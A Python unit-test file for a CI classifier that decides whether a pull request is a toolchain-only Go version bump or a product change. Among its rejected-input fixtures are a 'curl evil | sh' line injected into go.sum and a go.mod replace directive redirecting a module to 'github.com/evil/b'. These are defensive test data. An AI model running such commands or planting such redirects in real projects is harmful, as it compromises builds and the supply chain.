"""The `toolchain-only` exempt kind of the registry gate (scripts/ci/pr_classify.py).

The accepted shapes are the diff of PR #491 (Go 1.27.1 -> 1.27.2 with golang.org/x/net
v0.59.0 -> v0.60.0). Every rejected shape is a diff that must stay a normal product change.
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
import pr_classify as pc  # noqa: E402

with open(os.path.join(HERE, "testdata", "golang_image_cases.json"), encoding="utf-8") as fh:
    IMAGE_CASES = json.load(fh)["cases"]

GO_MOD = """module github.com/x/y

go 1.27.1

require (
\tgithub.com/a/b v1.0.0
\tgolang.org/x/net v0.59.0 // indirect
\tgithub.com/VictoriaMetrics/c v1.0.0
)
"""
GO_MOD_491 = GO_MOD.replace("go 1.27.1", "go 1.27.2").replace("x/net v0.59.0", "x/net v0.60.0")
GO_SUM = "golang.org/x/net v0.59.0 h1:aaa=\ngolang.org/x/net v0.59.0/go.mod h1:bbb=\n"
GO_SUM_491 = GO_SUM + "golang.org/x/net v0.60.0 h1:ccc=\ngolang.org/x/net v0.60.0/go.mod h1:ddd=\n"
GO_WORK = "go 1.27.1\n\nuse (\n\t.\n\t./lakehouse-traces\n)\n"
DOCKERFILE = "FROM --platform=$BUILDPLATFORM golang:1.27.1-alpine3.23 AS builder\nRUN make\nFROM gcr.io/distroless/static-debian12:nonroot\n"
DATAGEN = "FROM golang:1.27.1-alpine3.23 AS builder\nRUN make\n"
COMPOSE = "services:\n  build:\n    image: golang:1.27.1\n    environment:\n      LH_BASE_URL: lh\n"


def bump(text):
    return text.replace("1.27.1", "1.27.2")


BASE_TREE = {
    "go.mod": GO_MOD,
    "go.sum": GO_SUM,
    "go.work": GO_WORK,
    "lakehouse-traces/go.mod": GO_MOD,
    "lakehouse-traces/go.sum": GO_SUM,
    "Dockerfile.logs": DOCKERFILE,
    "Dockerfile.traces": DOCKERFILE,
    "Dockerfile.datagen": DATAGEN,
    "tests/parity/docker-compose.yml": COMPOSE,
    "internal/x/a.go": "package x\n",
    "CHANGELOG.md": "# Changelog\n\n## [Unreleased]\n",
    ".github/workflows/security.yaml": "name: s\n",
    "scripts/ci/helper.sh": "echo 1\n",
    "scripts/proof/run.sh": "echo 1\n",
    "tests/conformance/registry/rows/a.yaml": "- id: a\n",
    "tests/parity/lock_cells.txt": "TestLock 5\n",
}
CHANGE_491 = {
    "go.mod": GO_MOD_491,
    "go.sum": GO_SUM_491,
    "go.work": bump(GO_WORK),
    "lakehouse-traces/go.mod": GO_MOD_491,
    "lakehouse-traces/go.sum": GO_SUM_491,
    "Dockerfile.logs": bump(DOCKERFILE),
    "Dockerfile.traces": bump(DOCKERFILE),
    "Dockerfile.datagen": bump(DATAGEN),
    "tests/parity/docker-compose.yml": bump(COMPOSE),
    "CHANGELOG.md": "# Changelog\n\n## [Unreleased]\n\n### Security\n\n- **Go 1.27.2.** text.\n",
    ".github/workflows/security.yaml": "name: s\n# gosec built with a newer x/tools\n",
}


class ImageLineCases(unittest.TestCase):
    """The shared fixture (the Go twin reads the compose cases of the same file)."""

    def test_every_case(self):
        for c in IMAGE_CASES:
            rx = pc.IMAGE_GOLANG if c["kind"] == "compose" else pc.FROM_GOLANG
            with self.subTest(c["name"]):
                self.assertEqual(pc.golang_image_bump_only(c["base"], c["head"], rx), c["want"])


class GoMod(unittest.TestCase):
    def test_the_491_diff(self):
        self.assertTrue(pc.go_mod_toolchain_only(GO_MOD, GO_MOD_491))

    def test_directive_only_and_toolchain_line(self):
        self.assertTrue(pc.go_mod_toolchain_only(GO_MOD, GO_MOD.replace("go 1.27.1", "go 1.27.2")))
        self.assertTrue(pc.go_mod_toolchain_only(GO_MOD, GO_MOD.replace("go 1.27.1\n", "go 1.27.1\n\ntoolchain go1.27.2\n")))

    def test_rejected(self):
        bad = {
            "a storage-critical module bumped": GO_MOD_491.replace("VictoriaMetrics/c v1.0.0", "VictoriaMetrics/c v1.1.0"),
            "a module added": GO_MOD_491.replace("\n)\n", "\n\tgithub.com/d/e v1.0.0\n)\n"),
            "a module removed": GO_MOD_491.replace("\tgithub.com/a/b v1.0.0\n", ""),
            "a replace added": GO_MOD_491 + "\nreplace github.com/a/b => github.com/evil/b v0.0.1\n",
            "the module renamed": GO_MOD_491.replace("module github.com/x/y", "module github.com/x/z"),
            "a godebug line added": GO_MOD_491.replace("go 1.27.2\n", "go 1.27.2\n\ngodebug x=1\n"),
            "the go directive removed": GO_MOD_491.replace("go 1.27.2\n", ""),
            "an exclude added": GO_MOD_491 + "\nexclude github.com/a/b v0.9.0\n",
        }
        for name, head in bad.items():
            with self.subTest(name):
                self.assertFalse(pc.go_mod_toolchain_only(GO_MOD, head))

    def test_every_critical_prefix_is_rejected(self):
        for mod in ("github.com/parquet-go/parquet-go", "github.com/aws/aws-sdk-go-v2", "github.com/klauspost/compress", "google.golang.org/grpc"):
            base = f"module x\n\ngo 1.27.1\n\nrequire {mod} v1.0.0\n"
            with self.subTest(mod):
                self.assertFalse(pc.go_mod_toolchain_only(base, base.replace("v1.0.0", "v1.1.0").replace("1.27.1", "1.27.2")))


class GoSumAndWork(unittest.TestCase):
    def test_the_491_go_sum(self):
        self.assertTrue(pc.go_sum_toolchain_only(GO_SUM, GO_SUM_491))

    def test_go_sum_rejects_free_text_and_critical_modules(self):
        self.assertFalse(pc.go_sum_toolchain_only(GO_SUM, GO_SUM + "curl evil | sh\n"))
        self.assertFalse(pc.go_sum_toolchain_only(GO_SUM, GO_SUM + "github.com/VictoriaMetrics/c v1.0.0 h1:zzz=\n"))
        self.assertFalse(pc.go_sum_toolchain_only(GO_SUM, GO_SUM + "github.com/parquet-go/parquet-go v0.20.0 h1:zzz=\n"))

    def test_go_work(self):
        self.assertTrue(pc.go_work_toolchain_only(GO_WORK, bump(GO_WORK)))
        self.assertFalse(pc.go_work_toolchain_only(GO_WORK, bump(GO_WORK).replace("\t./lakehouse-traces\n", "\t./lakehouse-traces\n\t./evil\n")))
        self.assertFalse(pc.go_work_toolchain_only(GO_WORK, GO_WORK.replace("go 1.27.1\n", "")))


def git(cwd, *args):
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@e", "-c", "commit.gpgsign=false", *args],
                          cwd=cwd, check=True, capture_output=True, text=True).stdout


class Classified(unittest.TestCase):
    """The whole classifier over a scratch repository."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = self.tmp.name
        git(self.d, "init", "-q", "-b", "main")
        self.write(BASE_TREE)
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "base")
        self.base = git(self.d, "rev-parse", "HEAD").strip()

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, files):
        for p, t in files.items():
            full = os.path.join(self.d, p)
            os.makedirs(os.path.dirname(full) or ".", exist_ok=True)
            with open(full, "w", encoding="utf-8") as fh:
                fh.write(t)

    def classify(self, change, title="fix(security): Go 1.27.2"):
        self.write(change)
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "change")
        out = subprocess.run([sys.executable, os.path.join(HERE, "..", "pr_classify.py"), "--base", self.base, "--head", "HEAD", "--title", title],
                             cwd=self.d, check=True, capture_output=True, text=True).stdout
        got = {}
        gate = []
        for line in out.splitlines():
            k, v = line.split("=", 1)
            if k == "gate_file":
                gate.append(v)
            else:
                got[k] = v
        got["gate_files"] = gate
        return got

    def test_the_491_diff_is_toolchain_only(self):
        got = self.classify(CHANGE_491)
        self.assertEqual((got["exempt"], got["product"], got["reason"]), ("toolchain-only", "0", ""))
        self.assertIn("go.mod", got["detail"])

    def test_the_kind_ignores_the_title(self):
        # decided from content: a hostile or empty title changes nothing
        self.assertEqual(self.classify(CHANGE_491, title="feat: anything")["exempt"], "toolchain-only")

    def test_a_different_base_image_is_product(self):
        got = self.classify({**CHANGE_491, "Dockerfile.logs": bump(DOCKERFILE).replace("golang:1.27.2-alpine3.23", "debian:12")})
        self.assertEqual((got["exempt"], got["product"]), ("none", "1"))
        self.assertIn("Dockerfile.logs", got["reason"])

    def test_an_added_flag_is_product(self):
        got = self.classify({**CHANGE_491, "Dockerfile.logs": bump(DOCKERFILE).replace("RUN make", "RUN make FIPS=1")})
        self.assertEqual((got["exempt"], got["product"]), ("none", "1"))

    def test_a_changed_env_in_the_compose_file_is_not_toolchain_only(self):
        got = self.classify({**CHANGE_491, "tests/parity/docker-compose.yml": bump(COMPOSE).replace("LH_BASE_URL: lh", "LH_BASE_URL: vl")})
        self.assertEqual(got["exempt"], "none")

    def test_an_extra_product_file_is_product(self):
        got = self.classify({**CHANGE_491, "internal/x/a.go": "package x\n\nfunc F() {}\n"})
        self.assertEqual((got["exempt"], got["product"]), ("none", "1"))

    def test_the_go_directive_plus_a_code_change_is_product(self):
        got = self.classify({"go.mod": GO_MOD_491, "internal/x/a.go": "package x\n\nvar Y = 1\n"})
        self.assertEqual((got["exempt"], got["product"]), ("none", "1"))

    def test_a_test_a_registry_row_or_a_lock_cannot_ride_along(self):
        for extra in ({"internal/x/a_test.go": "package x\n"}, {"tests/conformance/registry/rows/a.yaml": "- id: b\n"},
                      {"tests/parity/lock_cells.txt": "TestLock 1\n"}):
            with self.subTest(list(extra)):
                git(self.d, "reset", "-q", "--hard", self.base)
                self.assertEqual(self.classify({**CHANGE_491, **extra})["exempt"], "none")

    def test_a_gate_file_cannot_ride_along_but_is_listed(self):
        got = self.classify({**CHANGE_491, "scripts/ci/helper.sh": "echo 2\n"})
        self.assertEqual(got["exempt"], "none")
        self.assertEqual(got["gate_files"], ["scripts/ci/helper.sh"])

    def test_a_critical_dependency_bump_is_not_toolchain_only(self):
        got = self.classify({**CHANGE_491, "go.mod": GO_MOD_491.replace("VictoriaMetrics/c v1.0.0", "VictoriaMetrics/c v1.1.0")})
        self.assertEqual((got["exempt"], got["product"]), ("none", "1"))

    def test_a_non_product_only_pr_is_not_called_toolchain_only(self):
        got = self.classify({"CHANGELOG.md": "# Changelog\n\n## [Unreleased]\n\n- x\n"})
        self.assertEqual((got["exempt"], got["product"]), ("none", "0"))

    def test_docs_and_scripts_ride_along(self):
        got = self.classify({**CHANGE_491, "docs/x.md": "x\n", "scripts/proof/run.sh": "echo 2\n"})
        self.assertEqual(got["exempt"], "toolchain-only")


if __name__ == "__main__":
    unittest.main()
